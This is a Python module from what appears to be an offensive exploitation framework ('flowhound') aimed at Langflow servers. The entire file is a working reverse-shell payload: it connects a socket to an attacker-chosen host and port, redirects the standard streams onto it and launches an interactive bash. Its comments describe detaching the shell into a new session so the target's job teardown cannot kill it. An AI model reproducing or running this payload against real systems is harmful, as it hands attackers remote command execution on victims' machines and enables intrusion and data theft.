from flowhound.vulnerabilities.payloads.base_payload_class import PayloadBaseClass


class Payload(PayloadBaseClass):
    blocking = True  # socket.connect + os.execv block; _popen_wrap needed

    def __init__(self, lhost: str, lport: int):
        self.lhost = lhost
        self.lport = lport
        self.payload = self.generate_payload(lhost=lhost, lport=lport)

    def generate_payload(self, lhost: str, lport: int) -> str:
        # Spawn bash as a fully detached child (new session, new process group)
        # so it outlives the Langflow thread/job that runs this code. The socket
        # is duplicated onto fds 0/1/2 before spawning so bash inherits them,
        # then the Python-side socket is closed. start_new_session=True moves
        # the child into its own session so Langflow's SIGTERM/job teardown
        # cannot reach it. A brief sleep lets the child inherit the fds before
        # the component returns and the thread is reclaimed.
        return (
            "import os, socket, subprocess, time\n"
            f"_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
            f"_s.connect(('{lhost}', {lport}))\n"
            "_fd = _s.fileno()\n"
            "os.dup2(_fd, 0); os.dup2(_fd, 1); os.dup2(_fd, 2)\n"
            "_s.close()\n"
            "subprocess.Popen(\n"
            "    ['/bin/bash', '-i'],\n"
            "    stdin=0, stdout=1, stderr=2,\n"
            "    close_fds=False,\n"
            "    start_new_session=True,\n"
            ")\n"
            "time.sleep(2)\n"
        )

    def load_payload(self) -> str:
        return self.payload
